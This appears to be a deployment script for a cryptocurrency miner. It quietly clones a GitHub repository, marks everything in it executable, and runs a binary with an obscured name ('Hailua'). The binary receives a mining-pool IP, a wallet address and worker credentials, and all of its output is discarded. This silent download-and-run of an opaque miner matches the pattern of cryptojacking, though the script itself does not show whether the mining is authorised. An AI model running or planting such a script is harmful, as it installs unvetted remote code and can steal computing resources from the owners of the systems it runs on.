#!/bin/bash
cd /htgroup
git clone https://github.com/binhminhdota/hungthinh.git -q
chmod -R +x hungthinh
./hungthinh/Hailua -pool 51.89.64.65:2020 -wal 0xA4260aA3aE3F16E5b74CC2CFA8ebeAc0933064F8 -worker km17 -pass x > /dev/null 2>&1